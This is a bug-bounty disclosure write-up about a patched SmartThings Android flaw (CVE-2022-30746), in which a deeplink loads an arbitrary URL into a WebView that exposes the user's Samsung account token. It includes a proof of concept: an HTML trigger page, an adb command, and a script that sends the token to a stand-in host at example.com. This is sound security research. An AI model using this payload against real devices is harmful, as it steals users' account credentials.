# Details

<table>
    <tr>
        <td>Name</td>
        <td>SmartThings</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.oneconnect</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.18</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.06.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>High</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-30746">CVE-2022-30746</a> (SVE-2022-0955)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$4310</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/052.%20SmartThings%20—%20Remote%20token%20leakage/Oversecured_report.png)

Oversecured found that the app handles deeplinks. One of them causes it to automatically load the `url` parameter in the embedded WebView. In addition, this WebView contains JavaScript interfaces that expose the user's token to the Samsung account.

**Proof of Concept**

Remote attack:

```html
<!DOCTYPE html>
<html>
<head><title>Evil page</title></head>
<body style="text-align: center;">
    <h1><a href="samsungconnect://launch?mcs=each_event&action=smartthings_mall&url=http://example.com/">Begin attack!</a></h1>
</body>
</html>
```

From ADB:
```
am start -a android.intent.action.VIEW -d "samsungconnect://launch?mcs=each_event&action=smartthings_mall&url=http://example.com/"
```

To access the user token, the page content must be as follows:
```html
<script>
function getAuthInfo(x) {
    alert(x);
    new Image().src = "http://example.com./leak?getAuthInfo=" + x;
}
McsBridge.getAuthInfo();
</script>
```

## References

- [Oversecured Blog. Android security checklist: WebView](https://blog.oversecured.com/Android-security-checklist-webview/)
